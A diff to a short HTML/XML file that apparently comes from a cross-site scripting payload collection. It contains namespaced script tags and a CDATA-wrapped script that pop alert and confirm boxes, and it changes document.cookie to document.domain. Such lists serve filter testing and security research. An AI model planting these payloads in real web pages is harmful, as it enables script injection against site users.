@@ -1,11 +1,11 @@
 <html>
 	<head></head>
 	<body>
-		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(document.cookie)</something:script>
+		<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(document.domain)</something:script>
 		<a:script xmlns:a="http://www.w3.org/1999/xhtml">alert('xss by madara')</a:script>
 		<info>
 		  <name>
-		    <value><![CDATA[<script>confirm(document.cookie)</script>]]></value>
+		    <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
 		  </name>
 		    <description>
 		      <value>Hello</value>
